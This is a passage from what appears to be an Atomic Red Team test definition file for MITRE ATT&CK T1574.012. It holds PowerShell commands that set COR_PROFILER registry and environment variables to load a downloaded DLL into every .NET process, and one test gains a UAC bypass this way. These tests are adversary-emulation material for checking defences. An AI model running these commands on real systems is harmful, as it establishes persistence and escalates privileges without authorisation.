      loads the Common Language Runtime (CLR). These profilers are designed to monitor,
      troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft
      Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)


      The COR_PROFILER environment variable can be set at various scopes (system,
      user, or process) resulting in different levels of influence. System and user-wide
      environment variable scopes are specified in the Registry, where a [Component
      Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can
      be registered as a profiler DLL. A process scope COR_PROFILER can also be created
      in-memory without modifying the Registry. Starting with .NET Framework 4, the
      profiling DLL does not need to be registered as long as the location of the
      DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft
      COR_PROFILER Feb 2013)


      Adversaries may abuse COR_PROFILER to establish persistence that executes a
      malicious DLL in the context of all .NET processes every time the CLR is invoked.
      The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account
      Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET
      process executes at a higher permission level, as well as to hook and [Impair
      Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation:
      RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation:
      Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation:
      subTee .NET Profilers May 2017)'
    mitre_examples: []
    mitre_id: T1574.012
    mitre_mitigations: []
    mitre_name: COR_PROFILER
    mitre_platforms: &id034
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1574/012
    - https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview
    - https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100)
    - https://redcanary.com/blog/blue-mockingbird-cryptominer/
    - https://redcanary.com/blog/cor_profiler-for-persistence/
    - https://offsec.almond.consulting/UAC-bypass-dotnet.html
    - https://github.com/OmerYa/Invisi-Shell
    - https://web.archive.org/web/20170720041203/http://subt0x10.blogspot.com/2017/05/subvert-clr-process-listing-with-net.html
    mitre_related_techniques: []
  name: User scope COR_PROFILER
  platforms:
  - windows
  prereq_command: 'if (Test-Path "#{file_name}") {exit 0} else {exit 1}

    '
  references: []
- atomic_id: f373b482-48c8-4ce4-85ed-d40c8b3f7310
  cleanup_command: 'Remove-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Session
    Manager\Environment'' -Name "COR_ENABLE_PROFILING" -Force -ErrorAction Ignore
    | Out-Null

    Remove-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment''
    -Name "COR_PROFILER" -Force -ErrorAction Ignore | Out-Null

    Remove-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment''
    -Name "COR_PROFILER_PATH" -Force -ErrorAction Ignore | Out-Null

    '
  command: 'Write-Host "Creating system environment variables" -ForegroundColor Cyan

    New-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment''
    -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null

    New-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment''
    -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null

    New-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment''
    -Name "COR_PROFILER_PATH" -PropertyType String -Value "#{file_name}" -Force |
    Out-Null

    '
  description: 'Creates system scope environment variables to enable a .NET profiler
    (COR_PROFILER). System scope environment variables require a restart to take effect.

    The unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded
    by any process. Additionally, the profiling DLL will inherit the integrity

    level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.
    If the account used is not a local administrator the profiler DLL will

    still execute each time the CLR is loaded by a process, however, the notepad process
    will not execute with high integrity.


    Reference: https://redcanary.com/blog/cor_profiler-for-persistence/

    '
  get_prereq_command: 'New-Item -Type Directory (split-path "#{file_name}") -ErrorAction
    ignore | Out-Null

    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll"
    -OutFile "#{file_name}"

    '
  input_arguments:
    clsid_guid:
      default: '{09108e71-974c-4010-89cb-acf471ae9e2c}'
      description: custom clsid guid
      type: string
    file_name:
      default: PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll
      description: unmanaged profiler DLL
      type: path
  mitre_info:
    mitre_data_sources: *id033
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may leverage the COR_PROFILER environment variable
      to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER
      is a .NET Framework feature which allows developers to specify an unmanaged
      (or external of .NET) profiling DLL to be loaded into each .NET process that
      loads the Common Language Runtime (CLR). These profilers are designed to monitor,
      troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft
      Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)


      The COR_PROFILER environment variable can be set at various scopes (system,
      user, or process) resulting in different levels of influence. System and user-wide
      environment variable scopes are specified in the Registry, where a [Component
      Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can
      be registered as a profiler DLL. A process scope COR_PROFILER can also be created
      in-memory without modifying the Registry. Starting with .NET Framework 4, the
      profiling DLL does not need to be registered as long as the location of the
      DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft
      COR_PROFILER Feb 2013)


      Adversaries may abuse COR_PROFILER to establish persistence that executes a
      malicious DLL in the context of all .NET processes every time the CLR is invoked.
      The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account
      Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET
      process executes at a higher permission level, as well as to hook and [Impair
      Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation:
      RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation:
      Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation:
      subTee .NET Profilers May 2017)'
    mitre_examples: []
    mitre_id: T1574.012
    mitre_mitigations: []
    mitre_name: COR_PROFILER
    mitre_platforms: *id034
    mitre_references:
    - https://attack.mitre.org/techniques/T1574/012
    - https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview
    - https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100)
    - https://redcanary.com/blog/blue-mockingbird-cryptominer/
    - https://redcanary.com/blog/cor_profiler-for-persistence/
    - https://offsec.almond.consulting/UAC-bypass-dotnet.html
    - https://github.com/OmerYa/Invisi-Shell
    - https://web.archive.org/web/20170720041203/http://subt0x10.blogspot.com/2017/05/subvert-clr-process-listing-with-net.html
    mitre_related_techniques: []
  name: System Scope COR_PROFILER
  platforms:
  - windows
  prereq_command: 'if (Test-Path "#{file_name}") {exit 0} else {exit 1}

    '
  references: []
- atomic_id: 79d57242-bbef-41db-b301-9d01d9f6e817
  cleanup_command: '$env:COR_ENABLE_PROFILING = 0

    $env:COR_PROFILER = ''''

    $env:COR_PROFILER_PATH = ''''

    '
  command: '$env:COR_ENABLE_PROFILING = 1

    $env:COR_PROFILER = ''#{clsid_guid}''

    $env:COR_PROFILER_PATH = ''"#{file_name}"''

    POWERSHELL -c ''Start-Sleep 1''

    '
  description: 'Creates process scope environment variables to enable a .NET profiler
    (COR_PROFILER) without making changes to the registry. The unmanaged profiler
    DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.


    Reference: https://redcanary.com/blog/cor_profiler-for-persistence/

    '
  get_prereq_command: 'New-Item -Type Directory (split-path "#{file_name}") -ErrorAction
    ignore | Out-Null

    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll"
    -OutFile "#{file_name}"

    '
  input_arguments:
    clsid_guid:
      default: '{09108e71-974c-4010-89cb-acf471ae9e2c}'
      description: custom clsid guid
      type: string
    file_name:
      default: PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll
      description: unamanged profiler DLL
      type: path
  mitre_info:
    mitre_data_sources: *id033
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may leverage the COR_PROFILER environment variable
      to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER
      is a .NET Framework feature which allows developers to specify an unmanaged
      (or external of .NET) profiling DLL to be loaded into each .NET process that
      loads the Common Language Runtime (CLR). These profilers are designed to monitor,
      troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft
      Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)


      The COR_PROFILER environment variable can be set at various scopes (system,
      user, or process) resulting in different levels of influence. System and user-wide
      environment variable scopes are specified in the Registry, where a [Component
      Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can
      be registered as a profiler DLL. A process scope COR_PROFILER can also be created
      in-memory without modifying the Registry. Starting with .NET Framework 4, the
      profiling DLL does not need to be registered as long as the location of the
      DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft
      COR_PROFILER Feb 2013)


      Adversaries may abuse COR_PROFILER to establish persistence that executes a
      malicious DLL in the context of all .NET processes every time the CLR is invoked.
      The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account
      Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET
      process executes at a higher permission level, as well as to hook and [Impair
      Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation:
      RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation:
      Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation:
      subTee .NET Profilers May 2017)'
    mitre_examples: []
    mitre_id: T1574.012
    mitre_mitigations: []
    mitre_name: COR_PROFILER
    mitre_platforms: *id034
    mitre_references:
    - https://attack.mitre.org/techniques/T1574/012
    - https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview
    - https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100)
    - https://redcanary.com/blog/blue-mockingbird-cryptominer/
    - https://redcanary.com/blog/cor_profiler-for-persistence/
    - https://offsec.almond.consulting/UAC-bypass-dotnet.html
    - https://github.com/OmerYa/Invisi-Shell
    - https://web.archive.org/web/20170720041203/http://subt0x10.blogspot.com/2017/05/subvert-clr-process-listing-with-net.html
    mitre_related_techniques: []
  name: Registry-free process scope COR_PROFILER
  platforms:
  - windows
  prereq_command: 'if (Test-Path "#{file_name}") {exit 0} else {exit 1}

    '
  references: []
